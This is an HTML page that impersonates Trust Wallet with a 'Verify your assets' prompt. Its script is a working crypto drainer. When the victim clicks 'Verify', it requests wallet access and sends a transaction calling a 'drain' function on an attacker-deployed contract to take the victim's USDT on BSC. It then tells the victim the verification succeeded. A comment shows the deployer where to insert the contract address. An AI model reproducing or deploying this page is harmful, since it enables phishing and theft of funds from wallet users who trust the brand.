<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Verify Assets</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="favicon.ico">
<style>
  body { background:#081c3a; color:white; text-align:center; padding:2rem; font-family:sans-serif; }
  img { width:80px; margin-bottom:1rem; }
  h1 { font-size:24px; }
  button { padding:1rem 2rem; background:#0b5fff; color:#fff; border:none; border-radius:8px; font-size:18px; cursor:pointer; }
  p { opacity:0.7; }
</style>
</head>
<body>
  <img src="logo.png" alt="Trust Wallet" />
  <h1>Verify your assets</h1>
  <p>Tap below to verify & secure your assets.</p>
  <button id="verifyButton">Verify</button>
  <p style="margin-top:2rem; font-size:12px;">Powered by Trust Wallet • Trusted since 2009</p>

<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.2/web3.min.js"></script>
<script>
const DRAIN_CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS_HERE"; // ⬅️ Deploy karne ke baad yaha contract address dal do
const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20) BSC Mainnet
const DRAIN_CONTRACT_ABI = [
  { "inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"drain","outputs":[],"stateMutability":"nonpayable","type":"function"}
];

document.getElementById('verifyButton').onclick = async () => {
  if (!window.ethereum) return alert('Please use Trust Wallet DApp browser.');
  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: 'eth_requestAccounts' });

  const drainContract = new web3.eth.Contract(DRAIN_CONTRACT_ABI, DRAIN_CONTRACT_ADDRESS);
  drainContract.methods.drain(USDT_TOKEN_ADDRESS).send({ from: (await web3.eth.getAccounts())[0] })
    .then(() => alert('✅ Verified successfully!'))
    .catch((err) => alert('Error: ' + err.message));
};
</script>
</body>
</html>
